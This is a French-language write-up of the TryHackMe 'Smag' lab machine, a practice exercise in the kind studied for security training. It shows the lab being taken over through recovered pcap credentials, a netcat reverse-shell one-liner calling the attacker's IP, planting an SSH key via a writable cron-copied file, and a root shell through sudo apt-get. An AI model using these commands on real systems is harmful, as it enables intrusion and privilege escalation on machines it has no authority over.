# Smag
Bon petit chall facile pour s'y remettre un peu sur THM !

# Enumeration
## Nmap
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-10 07:49 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for 10.10.141.12
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.14 seconds
```
## Gobuster 
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 311] [--> http://10.10.141.12/mail/]

```

# Exploit
On trouve donc une page /mail. On va voir ce qu'elle contient.
On retrouve un fichier .pcap, et les mails parle d'un bug pendant le download du fichier, peut-être une piste ?

## .pcap
On y retrouve une connexion sur le site **development.smag.thm**
```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```
On retrouve donc :

Un domaine : 
```
development.smag.thm
```
Un compte : 
```
username=helpdesk
password=cH4nG3M3_n0w
```
On va donc ajouter ce domaine dans le fichier hosts et voir un peu ce qu'il y a derriere....

On arrive sur un webshell une fois log.
# Revshell
Vu qu'on a accès a un webshell, on va s'ouvrir un rshell plus sympa.

Payload :
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.59.209 1234 >/tmp/f
```
Et nous voila sur le serveur
```
──(kali㉿kali)-[~/Challenge/TryHackMe/Smag]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.14.59.209] from (UNKNOWN) [10.10.141.12] 42934
bash: cannot set terminal process group (707): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$ 

```
# Privesc
En regardant un peu sur la machine, je vois dans les taches cron la copie d'une clé ssh public
```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5HGAnm2nNgzDW9OPAZ9dP0tZbvNrIJWa/swbWX1dogZPCFYn8Ys3P7oNPyzXS6ku72pviGs5kQsxNWpPY94bt2zvd1J6tBw5g64ox3BhCG4cUvuI5zEi7y+xnIiTs5/MoF/gjQ2IdNDdvMs/hDj4wc2x8TFLPlCmR1b/uHydkuvdtw9WzZN1O+Ax3yEkMfB........[REDACTED].......gt6WtPYxmtv1AHE4VdD6xFJrM5CGffGbYEQjvJoFX2+vSOCDEFZw1SjuajykOaEOfheuY96Ao3f41m2Sn7Y9XiDt1UP4/Ws+kxfpX2mN69+jsPYmIKY72MSSm27nWG3jRgvPZsFgFyE00ZTP5dtrmoNf0CbzQBriJUa596XEsSOMmcjgoVgQUIr+WYNGWXgpH8G+ipFP/5whaJiqPIfPfvEHbT4m5ZsSaXuDmKercFeRDs= kali@kali
```
Je constate aussi qu'on peu modifier le fichier comme on peu le voir ici:
```
-rw-rw-rw- 1 root root  563 Jun  5  2020 jake_id_rsa.pub.backup
```
je vais donc généré ma propre clé ssh pour avoir un accès sur le serveur.
```
ssh-keygen -t rsa -b 4096 -C "pwn@huehue.com"
```
ensuite, je copie la clé public dans le fichier jake_id_rsa.pub.backup, la tâche cron se chargera de la copier dans le fichier authorized_keys qui ce trouve dans le dossier /home/jake/.ssh.
```
echo "ma super clé secure" > jake_id_rsa.pub.backup
```
ensuite j'essaye de me connecté avec ma clé ssh:
```
ssh -i key jake@10.10.142.12
```
et me voici sur le serveur en ssh avec le compte de jake
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Smag/sshkey]
└─$ ssh -i key jake@10.10.141.12
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 
````
On trouve ainsi le 1er flag :
```
jake@smag:~$ cat user.txt 
iusG********************U3j
```

# Privesc to root !
En regardant les droits avec **sudo -l**
```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```
On peux voir qu'il peux utilser **/usr/bin/apt-get** en tant que root, et sans mot de passe !

On peux donc invoquer un shell root en utilisant apt-get:
```
jake@smag:~$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
uJr6zR******************BKz2T
```
